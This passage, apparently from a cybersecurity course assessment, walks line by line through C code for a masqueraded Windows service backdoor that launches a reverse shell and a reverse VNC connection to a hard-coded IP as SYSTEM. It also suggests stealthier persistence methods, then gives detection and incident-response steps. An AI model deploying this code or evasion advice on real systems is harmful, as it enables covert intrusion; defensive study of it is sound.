    if (dwCurrentState == SERVICE_START_PENDING)
        gSvcStatus.dwControlsAccepted = 0;
    else
        gSvcStatus.dwControlsAccepted = SERVICE_ACCEPT_STOP;
```
| Element | Explanation |
|---------|-------------|
| `dwControlsAccepted` | Bitmask telling the SCM which control requests this service will handle. |
| `0` | During startup, the service accepts NO controls. You can't stop a service that hasn't finished starting. |
| `SERVICE_ACCEPT_STOP` | Once running, the service declares it can handle STOP requests. |

> **Why it's there:** This is a required part of the service contract. The SCM uses this field to enable/disable the Stop button in `services.msc`.

---

```c
    if (dwCurrentState == SERVICE_RUNNING || dwCurrentState == SERVICE_STOPPED)
        gSvcStatus.dwCheckPoint = 0;
    else
        gSvcStatus.dwCheckPoint = dwCheckPoint++;
```
| Element | Explanation |
|---------|-------------|
| If the service is running or fully stopped, checkpoint is `0` (no pending operation). |
| Otherwise, use the current checkpoint counter and increment it for next time (`dwCheckPoint++` uses the current value, then adds 1). |

> **Why it's there:** Checkpoints are only meaningful during pending states. Setting to 0 in stable states is the Windows convention.

---

```c
    SetServiceStatus(gSvcStatusHandle, &gSvcStatus);
```
| Element | Explanation |
|---------|-------------|
| `SetServiceStatus()` | The actual Windows API call that sends the status update to the SCM. This is the function that "publishes" the service state. |
| `gSvcStatusHandle` | The handle obtained from `RegisterServiceCtrlHandlerW`. |
| `&gSvcStatus` | Pointer to the populated `SERVICE_STATUS` structure. |

> **Why it's there:** Without this call, the SCM never learns the service's state. The service would appear stuck or failed.

---

### 2.9 `DoPayload()` — Malicious Payload Execution

```c
void DoPayload(void)
```
| Element | Explanation |
|---------|-------------|
| The attacker-defined function that executes the actual malicious operations. Called once after the service reports `SERVICE_RUNNING`. |

---

```c
    // Write stealth proof
    HANDLE hFile = CreateFileW(L"C:\\Windows\\Temp\\c2\\.ghost",
```
| Element | Explanation |
|---------|-------------|
| `CreateFileW()` | The Windows API for creating or opening files. Despite its name, it creates OR opens files. The `W` suffix = wide-character version. |
| `L"C:\\Windows\\Temp\\c2\\.ghost"` | The file path. `.ghost` starts with a dot, making it slightly less visible. The directory was defined earlier as `STAGING_DIR` but the code uses a literal here. |

---

```c
        GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_HIDDEN, NULL);
```
| Parameter | Explanation |
|-----------|-------------|
| `GENERIC_WRITE` | Desired access: write-only. |
| `0` | Share mode: no sharing. Other processes cannot open this file while we have it. |
| `NULL` | Default security attributes. |
| `CREATE_ALWAYS` | Creation disposition: always create a new file, overwriting if it exists. |
| `FILE_ATTRIBUTE_HIDDEN` | File attributes: mark the file as **hidden**. Hidden files don't appear in standard directory listings unless "Show hidden files" is enabled. |
| `NULL` | No template file. |

> **Why it's there:** This writes a "heartbeat" or proof-of-execution file. The `.ghost` file proves the service ran and reached the payload stage. The hidden attribute adds a basic layer of stealth.

---

```c
    if (hFile != INVALID_HANDLE_VALUE) {
```
| Element | Explanation |
|---------|-------------|
| `INVALID_HANDLE_VALUE` | Windows constant (`(HANDLE)-1`) returned by `CreateFileW` on failure. Unlike most handles which return `NULL` on failure, `CreateFile` uses this special value. |

---

```c
        const char *msg = "1";
```
| Element | Explanation |
|---------|-------------|
| A simple ASCII string containing the character `"1"`. This is just a flag/heartbeat indicator. |

---

```c
        DWORD written;
        WriteFile(hFile, msg, 1, &written, NULL);
```
| Element | Explanation |
|---------|-------------|
| `WriteFile()` | Writes data to a file handle. |
| `hFile` | The file handle. |
| `msg` | Buffer to write. |
| `1` | Number of bytes to write. |
| `&written` | Output parameter: receives the actual number of bytes written. |
| `NULL` | No overlapped I/O (synchronous write). |

---

```c
        CloseHandle(hFile);
    }
```
| Element | Explanation |
|---------|-------------|
| Closes the file handle, flushing any buffered data and releasing the kernel object. |

---

```c
    // === POST-EXPLOITATION CHAIN ===
    // Auto-reestablish C2 and VNC on every boot as SYSTEM
```
| Element | Explanation |
|---------|-------------|
| Comments explicitly document the attacker's intent: **Command and Control (C2)** re-establishment and **VNC** remote access on every system boot, running as `SYSTEM`. |

---

```c
    LaunchProcessAsSystem(L"C:\\Windows\\Temp\\c2\\spoolsv.exe", NULL);
```
| Element | Explanation |
|---------|-------------|
| Launches `spoolsv.exe` from the staging directory. |
| **Name masquerading:** `spoolsv.exe` is the legitimate Windows Print Spooler service executable. By using this name, the attacker hopes to blend in with normal system processes in task manager or process listings. |
| `NULL` arguments: no command-line arguments passed. |

> **Why it's there:** This is likely a **reverse shell** — a program that connects back to the attacker's machine, giving them a command-line interface on the compromised system. Running as `SYSTEM` means the attacker has unrestricted access.

---

```c
    Sleep(5000);
```
| Element | Explanation |
|---------|-------------|
| `Sleep()` | Suspends the current thread for the specified number of milliseconds. |
| `5000` = 5 seconds. |

> **Why it's there:** Staggering process launches reduces the chance of triggering behavioural detection that flags multiple simultaneous suspicious process spawns. Also allows the reverse shell to establish before the VNC starts.

---

```c
    LaunchProcessAsSystem(L"C:\\Windows\\Temp\\c2\\vncserver.exe", L"-run");
```
| Element | Explanation |
|---------|-------------|
| Launches `vncserver.exe` with the `-run` argument. VNC (Virtual Network Computing) is a remote desktop protocol. |

> **Why it's there:** This establishes a **remote graphical desktop** connection, allowing the attacker to see and interact with the victim's screen, not just a command line.

---

```c
    Sleep(2000);
```
| Element | Explanation |
|---------|-------------|
| Another delay — 2 seconds. |

---

```c
    STARTUPINFOW si = { sizeof(si) };
```
| Element | Explanation |
|---------|-------------|
| `STARTUPINFOW` | A Windows structure that specifies window station, desktop, standard handles, and appearance for a new process. Must be passed to `CreateProcessW`. |
| `{ sizeof(si) }` | Initialises the structure by setting the first member (`cb`, the size) to the structure's size. This is **mandatory** — `CreateProcess` uses the size field to determine which version of the structure you're using. The rest of the structure is zero-initialised. |

> **Why it's there:** `CreateProcessW` requires a `STARTUPINFO` structure. Setting `cb = sizeof(si)` is the standard Windows idiom for initialising this structure.

---

```c
    PROCESS_INFORMATION pi = { 0 };
```
| Element | Explanation |
|---------|-------------|
| `PROCESS_INFORMATION` | A Windows structure that receives information about a newly created process: process handle, thread handle, process ID, and thread ID. |
| `{ 0 }` | Initialises all members to zero. |

---

```c
    wchar_t vncCmd[MAX_PATH * 2];
```
| Element | Explanation |
|---------|-------------|
| Buffer for the VNC command line. `MAX_PATH * 2` (520 characters) provides plenty of room for the path plus arguments. |

---

```c
    swprintf(vncCmd, MAX_PATH * 2, L"\"C:\\Windows\\Temp\\c2\\vncserver.exe\" -controlapp -connect 192.168.1.92");
```
| Element | Explanation |
|---------|-------------|
| `swprintf()` | Wide-character version of `sprintf()` — formats a string into a buffer. |
| `vncCmd` | Output buffer. |
| `MAX_PATH * 2` | Buffer size in characters. |
| Format string with literal path and arguments. |
| `-controlapp` | Likely a VNC server mode flag. |
| `-connect 192.168.1.92` | Tells the VNC server to initiate a **reverse connection** to the attacker's IP address (`192.168.1.92`). This is a **reverse VNC** technique where the victim connects outbound to the attacker, bypassing inbound firewall rules. |

> **Why it's there:** The reverse connection is critical for bypassing NAT and firewalls. Most firewalls block incoming connections but allow outgoing connections. By having the victim connect OUT to the attacker, the attacker doesn't need to punch through the victim's firewall.

---

```c
    CreateProcessW(NULL, vncCmd, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
```
| Parameter | Explanation |
|-----------|-------------|
| `NULL` (application name) | When the first parameter is `NULL`, Windows parses the command line (second parameter) to find the executable. |
| `vncCmd` | The command-line string to execute. |
| `NULL, NULL` | Process and thread security attributes. |
| `FALSE` | Inherit handles: child does NOT inherit parent's handles. |
| `CREATE_NO_WINDOW` | Creation flags: the process is created **without a visible console window**. This prevents a command prompt from flashing on screen. |
| `NULL` | Environment block (inherits parent's). |
| `NULL` | Current directory (inherits parent's). |
| `&si` | Pointer to `STARTUPINFOW`. |
| `&pi` | Pointer to `PROCESS_INFORMATION` (receives output). |

> **Why it's there:** Creates the VNC reverse connection process. Using `CREATE_NO_WINDOW` is a stealth technique — users won't see a console window pop up.

---

```c
    if (pi.hProcess) {
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }
```
| Element | Explanation |
|---------|-------------|
| Closes the process and thread handles returned by `CreateProcessW`. These handles are not needed after creation. |

---

### 2.10 `LaunchProcessAsSystem()` — Process Launcher Helper

```c
BOOL LaunchProcessAsSystem(LPCWSTR exePath, LPCWSTR args)
```
| Element | Explanation |
|---------|-------------|
| A reusable helper that wraps `CreateProcessW` for launching executables. Since the service runs as `SYSTEM`, child processes inherit this privilege by default. |

---

```c
    STARTUPINFOW si = { sizeof(si) };
    PROCESS_INFORMATION pi = { 0 };
```
| Element | Explanation |
|---------|-------------|
| Same initialisation pattern as in `DoPayload`. |

---

```c
    wchar_t cmdLine[MAX_PATH * 2];
```
| Element | Explanation |
|---------|-------------|
| Buffer for the constructed command line. |

---

```c
    if (args)
        swprintf(cmdLine, MAX_PATH * 2, L"\"%s\" %s", exePath, args);
    else
        swprintf(cmdLine, MAX_PATH * 2, L"\"%s\"", exePath);
```
| Element | Explanation |
|---------|-------------|
| Constructs the command line with proper quoting. Paths with spaces MUST be enclosed in double quotes or Windows cannot parse them correctly. |
| `"\"%s\" %s"` = `"path" args` |
| `"\"%s\""` = `"path"` (no args) |

---

```c
    BOOL result = CreateProcessW(NULL, cmdLine, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
```
| Element | Explanation |
|---------|-------------|
| Creates the process. Stores the boolean success/failure in `result`. |

---

```c
    if (result) {
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }
    return result;
```
| Element | Explanation |
|---------|-------------|
| Closes handles on success and returns whether creation succeeded. |

---

## 3. Key Concepts

---

### 3.1 Windows Services Architecture

A **Windows Service** is a long-running executable that operates in the background, typically without user interaction. Services are managed by the **Service Control Manager (SCM)** — a special system process (`services.exe`) that:

- Maintains the service database in the Registry (`HKLM\SYSTEM\CurrentControlSet\Services\`)
- Starts, stops, pauses, and resumes services
- Monitors service health
- Handles service dependencies

Services are ideal for persistence because:
- They start **before user login**
- They run under powerful accounts (`LocalSystem`, `NetworkService`, `LocalService`)
- They survive user logoff
- They restart automatically on failure (if configured)

---

### 3.2 Service Control Manager (SCM)

The SCM is the central authority for all services. Key interactions:

| API Function | Purpose |
|--------------|---------|
| `OpenSCManagerW()` | Connect to the SCM database |
| `CreateServiceW()` | Register a new service |
| `OpenServiceW()` | Obtain a handle to an existing service |
| `DeleteService()` | Remove a service |
| `StartServiceW()` | Start a service programmatically |
| `ControlService()` | Send control codes (stop, pause, etc.) |

The SCM stores service configuration in the **Registry**:
```
HKLM\SYSTEM\CurrentControlSet\Services\SecurityHealthHost
```
This registry key contains:
- `ImagePath`: path to the executable
- `Start`: start type (2 = auto, 3 = manual, 4 = disabled)
- `Type`: service type (16 = own process)
- `ObjectName`: the account it runs as (default = `LocalSystem`)
- `Description`: the human-readable description

---

### 3.3 ServiceMain vs. main

| Aspect | `main()` / `wmain()` | `SvcMain()` |
|--------|----------------------|-------------|
| Called by | C runtime (`crt0`) | Service Control Manager |
| When | Program starts | SCM starts the service |
| Arguments | User command line | Service arguments (from registry) |
| Must call | `StartServiceCtrlDispatcherW` | `RegisterServiceCtrlHandlerW` |
| Thread | Main thread | New thread created by SCM |
| Blocking | Runs to completion | Typically waits on event |

The relationship:
```
SCM -> starts service executable
       |
       v
   wmain() calls StartServiceCtrlDispatcherW()
       |
       v
   SCM creates thread -> calls SvcMain()
       |
       v
   SvcMain registers handler, reports status, runs payload
```

---

### 3.4 Service Control Handler

The **Service Control Handler** is a callback function that receives control requests from the SCM. It's essentially the service's "inbox" for administrative commands.

The handler runs on a **separate thread** from `SvcMain`. This means:
- It must be **thread-safe**
- It must return **quickly** (don't block)
- It typically signals an event for `SvcMain` to act upon

Common control codes:
| Code | Meaning |
|------|---------|
| `SERVICE_CONTROL_STOP` | Stop the service |
| `SERVICE_CONTROL_PAUSE` | Pause the service |
| `SERVICE_CONTROL_CONTINUE` | Resume a paused service |
| `SERVICE_CONTROL_INTERROGATE` | Check if service is alive |
| `SERVICE_CONTROL_SHUTDOWN` | System is shutting down |

---

### 3.5 SERVICE_STATUS Structure

```c
typedef struct _SERVICE_STATUS {
    DWORD dwServiceType;        // Type of service
    DWORD dwCurrentState;       // Current state (running, stopped, etc.)
    DWORD dwControlsAccepted;   // Which controls are accepted
    DWORD dwWin32ExitCode;      // Error code
    DWORD dwServiceSpecificExitCode; // Service-specific error
    DWORD dwCheckPoint;         // Progress counter during pending states
    DWORD dwWaitHint;           // Time before next status update
} SERVICE_STATUS;
```

Service states:
| State | Meaning |
|-------|---------|
| `SERVICE_STOPPED` | Not running |
| `SERVICE_START_PENDING` | Starting up |
| `SERVICE_RUNNING` | Fully operational |
| `SERVICE_STOP_PENDING` | Shutting down |
| `SERVICE_CONTINUE_PENDING` | Resuming from pause |
| `SERVICE_PAUSE_PENDING` | Pausing |
| `SERVICE_PAUSED` | Paused |

---

### 3.6 StartServiceCtrlDispatcher

`StartServiceCtrlDispatcherW()` is the **gatekeeper** function:

- It **blocks** the calling thread
- It tells the SCM: "I am a service executable; here is my dispatch table"
- The SCM then calls the appropriate `SvcMain` function in a new thread
- It returns only when ALL services in the dispatch table have stopped

**Failure modes:**
- If called from command line (not by SCM), it fails with error `1063` (`ERROR_FAILED_SERVICE_CONTROLLER_CONNECT`)
- This is why you cannot simply double-click a service `.exe` — it must be started via the SCM

---

### 3.7 `wmain` vs. `main`

| Feature | `main()` | `wmain()` |
|---------|----------|-----------|
| Character set | ANSI/MBCS (`char`) | Unicode (`wchar_t`) |
| Arguments | `char *argv[]` | `wchar_t *argv[]` |
| Windows API | Requires conversions | Direct compatibility |
| Modern Windows | Legacy | Preferred |

Windows uses **UTF-16** internally. Using `wmain` avoids:
- Code page conversion issues
- International character corruption
- Incompatibility with `W`-suffix APIs

The Windows API has **dual versions** of most functions:
- `CreateFileA` — ANSI version
- `CreateFileW` — Wide/Unicode version
- `CreateFile` — macro that expands to `CreateFileA` or `CreateFileW` based on `UNICODE` define

This program explicitly uses `W` versions and `wchar_t` throughout, ensuring full Unicode support.

---

### 3.8 Wide Strings (`wchar_t`, `LPWSTR`, `LPCWSTR`)

| Type | Meaning | Size |
|------|---------|------|
| `char` | ANSI/ASCII character | 1 byte |
| `wchar_t` | Wide character (UTF-16 on Windows) | 2 bytes |
| `LPSTR` | Long Pointer to STRing (`char*`) | - |
| `LPWSTR` | Long Pointer to Wide STRing (`wchar_t*`) | - |
| `LPCSTR` | Long Pointer to Constant STRing (`const char*`) | - |
| `LPCWSTR` | Long Pointer to Constant Wide STRing (`const wchar_t*`) | - |

String literal prefixes:
| Prefix | Type | Example |
|--------|------|---------|
| None | `char[]` | `"hello"` |
| `L` | `wchar_t[]` | `L"hello"` |
| `u8` | UTF-8 `char[]` | `u8"hello"` |

Wide string functions have `w` or `W` in their names:
- `printf()` → `wprintf()`
- `sprintf()` → `swprintf()`
- `strcmp()` → `wcscmp()`
- `stricmp()` → `_wcsicmp()` (Windows-specific, case-insensitive)

---

### 3.9 Auto-Start Configuration

The service is configured with `SERVICE_AUTO_START`:

```
Registry: HKLM\SYSTEM\CurrentControlSet\Services\SecurityHealthHost
    Start = 2 (SERVICE_AUTO_START)
```

Start type values:
| Value | Constant | Meaning |
|-------|----------|---------|
| 0 | `SERVICE_BOOT_START` | Started by boot loader (drivers only) |
| 1 | `SERVICE_SYSTEM_START` | Started during kernel init (drivers only) |
| 2 | `SERVICE_AUTO_START` | Started automatically by SCM |
| 3 | `SERVICE_DEMAND_START` | Manual start (via `net start` or GUI) |
| 4 | `SERVICE_DISABLED` | Cannot be started |

With `SERVICE_AUTO_START`, the SCM starts this service during system boot — before any user logs in. This ensures the attacker's payload executes on every boot, maintaining **persistence**.

---

## 4. Why This Technique Works (Red Team Perspective)

### 4.1 Privilege Escalation by Design
Services running with no explicit account default to **`LocalSystem`**. This account:
- Has **higher privileges** than Administrator
- Can access any file on the system
- Can read the SAM database (password hashes)
- Can interact with any process
- Has a SID of `S-1-5-18`

The attacker doesn't need to "escalate" — they get `SYSTEM` automatically just by installing a service.

### 4.2 Persistence
`SERVICE_AUTO_START` means the backdoor survives:
- Reboots
- User logoff/logon
- Session changes
- Most "cleanup" attempts that only check user startup folders

The only way to remove it is to:
- Delete the service (`sc delete`)
- Manually remove the registry key
- Or detect and remove the executable before it runs

### 4.3 Masquerading
The service name (`SecurityHealthHost`), display name (`Windows Security Health Host`), and description all mimic legitimate Windows services:
- **Legitimate:** `SecurityHealthService` (the real Windows Security Health Service)
- **Malicious:** `SecurityHealthHost` (one letter different)

This exploits:
- **Trust in Microsoft branding**
- **Analyst fatigue** (hundreds of services exist; one more won't stand out)
- **Similarity bias** (it looks almost like a known-good service)

### 4.4 Process Masquerading
The payload executables use names of legitimate Windows processes:
- `spoolsv.exe` — real Windows Print Spooler
- `vncserver.exe` — while not a default Windows binary, it blends into process listings

Administrators scanning running processes may dismiss these as legitimate system components.

5. **Reverse Connections:**
Both the reverse shell and VNC use **outbound connections**:
- Bypasses inbound firewalls and NAT
- Appears as normal outgoing traffic (harder to detect than listening ports)
- The attacker doesn't need to know the victim's IP or have port forwarding

6. **Hidden Files:**
The `.ghost` heartbeat file is:
- In a `Temp` directory (normal looking location)
- Named with a leading dot (Unix-style hidden file convention, partially effective on Windows)
- Marked with `FILE_ATTRIBUTE_HIDDEN`

---

## 4.5 Real-World Priming

### The Lab Lie

**What the lab lets you believe:** Installing a fake Windows service is a reliable way to achieve persistence and SYSTEM privileges.

**What the lab hides from you:** Service creation generates **Event ID 7045** immediately — logged by default with no configuration needed. EDR correlates "new service from temp directory" as a high-severity alert. Auto-start services are enumerated by `autoruns.exe` and similar tools within minutes of login. The service name `SecurityHealthHost` is one letter off from the real `SecurityHealthService` — a trivial string distance check flags it.

### How It Dies in Production

| Defense | How It Kills This Technique | Your Lab Bypass |
|---------|---------------------------|-----------------|
| Event ID 7045 | Logs every service creation instantly | No SIEM to collect logs |
| EDR behavioral rules | "New service from non-standard path" = instant alert | No EDR in lab |
| AutoRuns / Sysinternals | Lists all auto-start services; fake name stands out | No blue team hunting |
| Service signature requirements | Some environments require signed drivers/services | No such policy in lab |
| Parent-child detection | `services.exe` spawning children from `Temp` is suspicious | No telemetry correlation |

### What a Professional Red Teamer Would Do

**Instead of a fake service, they would use:**
- **WMI event subscription** — no service creation, no Event ID 7045, triggers on events like user logon
- **Scheduled task with hidden trigger** — `schtasks` with `/RU SYSTEM` and a benign-looking action
- **Registry run key with masqueraded name** — `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run` with a name like `OneDriveUpdate`
- **DLL hijacking** — no new process, no new service, just a legitimate app loading a malicious DLL

**Key difference:** The pro avoids creating new OS objects. Every new service, task, or registry key is a potential detection point. They hide in existing noise.

### What to Learn Next

| Concept | Why It Matters | Where to Start |
|---------|---------------|----------------|
| WMI event subscriptions | Persistence without service creation | PowerShell: `Register-WmiEvent` |
| Scheduled task hijacking | SYSTEM persistence with minimal footprint | `schtasks.exe` documentation |
| DLL search order hijacking | No new process, no new service | ired.team: "DLL Hijacking" |
| Registry run keys | Classic but still effective with good masquerading | MITRE ATT&CK T1547.001 |

### The Honest Bottom Line

> This service persistence technique teaches SCM APIs, service architecture, and auto-start configuration. It does not teach operational persistence. In the real world, service creation is the **loudest** persistence technique — logged by default, visible in every startup scanner, trivial to detect. The value is understanding how services work. Learn WMI persistence and DLL hijacking next.

---

## 5. Detection Vectors and Mitigation

### 5.1 Detection Vectors

#### A. Registry Analysis
```powershell
# List all auto-start services
Get-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Services\* | 
    Where-Object { $_.Start -eq 2 } | 
    Select-Object PSChildName, ImagePath, DisplayName
```

**What to look for:**
- Services with suspicious `ImagePath` values pointing to `Temp`, `Users`, or unusual directories
- Services whose `ImagePath` points to an executable **outside** `C:\Windows\System32\` or `C:\Windows\SysWOW64\`
- Display names that closely mimic legitimate services but have slight differences
- Services with no digital signature on the executable

#### B. Process Analysis
```powershell
# Check process path vs. expected path
Get-Process spoolsv | Select-Object Name, Path
```

**What to look for:**
- `spoolsv.exe` running from anywhere other than `C:\Windows\System32\`
- Unknown processes running as `NT AUTHORITY\SYSTEM`
- Parent-child relationships: a service process spawning unexpected children

#### C. Network Connections
```powershell
# Check outbound connections from system processes
Get-NetTCPConnection | Where-Object { 
    $_.OwningProcess -in (Get-Process spoolsv).Id 
}
```

**What to look for:**
- `spoolsv.exe` or other system processes making outbound connections to external IPs
- Connections on unusual ports from `SYSTEM` processes
- VNC traffic (typically port 5900) originating from internal hosts

#### D. File System Artifacts
```powershell
# Show hidden files in staging directory
Get-ChildItem -Path "C:\Windows\Temp" -Force -Recurse | 
    Where-Object { $_.Attributes -match "Hidden" }
```

**What to look for:**
- Unexpected directories like `c2` inside `C:\Windows\Temp`
- Hidden files (`.ghost`)
- Executables in temp directories that shouldn't be there

#### E. Event Logs
- **System Log (Event ID 7045):** A new service was installed (`Service Control Manager`)
- **Security Log (Event ID 4697):** A service was installed (if audit policy enabled)
- **Windows Defender / EDR alerts:** Behavioural detections on process injection, suspicious parent-child, etc.

#### F. Service Configuration Inspection
```cmd
sc query type= service start= auto state= all
sc qc SecurityHealthHost
sc qdescription SecurityHealthHost
```

### 5.2 Mitigation Strategies

| Layer | Control | Implementation |
|-------|---------|----------------|
| **Prevent Installation** | Least Privilege | Users should not have admin rights; service creation requires admin |
| **Detect Installation** | Audit Policy | Enable auditing for service creation (Event ID 4697) |
| **Detect Execution** | EDR / AV | Endpoint Detection and Response tools flag suspicious service behaviours |
| **Network** | Egress Filtering | Block outbound connections to unknown IPs, especially on non-standard ports |
| **File Integrity** | Application Whitelisting | AppLocker or Windows Defender Application Control (WDAC) prevents unauthorised executables from running |
| **Behavioural** | Parent-Child Detection | Alert when `services.exe` spawns children in temp directories |
| **Registry** | Baseline Monitoring | Alert when new auto-start services are registered |
| **User Education** | Phishing Training | Initial access often comes via phishing; the service is the persistence, not the entry |

### 5.3 Incident Response Steps

If this service is discovered on a system:

1. **Isolate** the system from the network immediately
2. **Document** the service configuration: `sc qc SecurityHealthHost`
3. **Stop** the service: `sc stop SecurityHealthHost`
4. **Delete** the service: `sc delete SecurityHealthHost`
5. **Remove** payload files from `C:\Windows\Temp\c2\`
6. **Kill** any running malicious processes
7. **Analyse** network logs for the attacker IP (`192.168.1.92` in this sample)
8. **Check** for additional persistence mechanisms (scheduled tasks, registry run keys, WMI events)
9. **Rotate** credentials — the attacker had `SYSTEM` access and may have dumped password hashes
10. **Rebuild** if sensitive data was accessed (forensic certainty is difficult with `SYSTEM` compromise)

---

## 6. Summary

This program demonstrates a **complete Windows service-based persistence mechanism** from installation through payload execution. Every component serves a dual purpose: operational functionality and stealth/masquerading.

| Component | Legitimate Purpose | Malicious Purpose |
|-----------|-------------------|-------------------|
| Service installation | Register legitimate background tasks | Persistence, auto-start on boot |
| `LocalSystem` account | Run critical OS components | Unrestricted privilege level |
| Service name/description | Identify service function | Social engineering, masquerading |
| `CreateProcessW` | Launch helper programs | Execute reverse shell and VNC |
| Hidden files | Hide system files from users | Conceal heartbeat/proof files |
| Reverse connections | Software updates, telemetry | Bypass firewalls, establish C2 |

Understanding these techniques is essential for defenders. The same APIs and structures used legitimately by Windows are weaponised by attackers. Detection requires:
- **Knowing what's normal** (legitimate services, normal process paths)
- **Monitoring for deviations** (new auto-start services, processes in temp directories)
- **Layered defences** (prevent, detect, respond)

---

*Document generated for educational purposes — Certificate IV Cyber Security final assessment.*
